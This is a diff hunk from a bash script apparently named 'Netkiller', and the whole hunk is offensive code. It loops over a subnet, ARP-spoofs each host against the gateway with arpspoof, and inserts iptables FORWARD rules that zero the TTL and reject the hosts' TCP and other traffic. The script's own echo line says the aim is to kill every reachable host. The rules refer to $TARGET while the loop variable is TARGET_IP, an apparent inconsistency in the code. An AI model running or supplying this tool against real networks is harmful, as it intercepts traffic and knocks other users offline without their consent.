@@ -134,9 +134,9 @@ if [[ -n "$HOSTMIN" && -n "$HOSTMAX" ]]; then
     for ((i=START; i<=END; i++)); do
         TARGET_IP=$(int2ip "$i")
         ( arpspoof -i "$INTERFACE" -t "$TARGET_IP" -r "$GATEWAY" >/dev/null 2>&1 ) &
-          iptables -t mangle -A FORWARD -s "$TARGET" -j TTL --ttl-set 0
-          iptables -A FORWARD -s "$TARGET" -p tcp -j REJECT --reject-with tcp-reset
-          iptables -A FORWARD -s "$TARGET" -j REJECT --reject-with icmp-host-unreachable
+          iptables -t mangle -I FORWARD 2 -s "$TARGET" -j TTL --ttl-set 0
+          iptables -I FORWARD 2 -s "$TARGET" -p tcp -j REJECT --reject-with tcp-reset
+          iptables -I FORWARD 3 -s "$TARGET" -j REJECT --reject-with icmp-host-unreachable
     done
 fi
 echo "Netkiller kill all the possible hosts in $TARGET_SUBNET"
